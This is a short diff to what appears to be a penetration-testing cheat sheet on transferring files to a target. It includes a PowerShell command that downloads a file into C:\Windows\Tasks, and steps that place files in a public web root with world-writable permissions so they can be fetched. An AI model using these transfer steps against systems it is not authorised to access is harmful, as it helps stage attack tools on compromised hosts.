@@ -43,8 +43,8 @@ iwr "http://sourceIP/file.ext" -outfile "C:\Windows\Tasks\file.ext"
 ## HTML
 If your target has a public facing Webpage you can use it to download the files.
 ```bash
-cp *.ext /var/www/html/
-chmod 0777 /var/www/html/*.ext
+cp file.ext /var/www/html/
+chmod 0777 /var/www/html/file.ext
 http://source.URL/file.ext
 ```
 
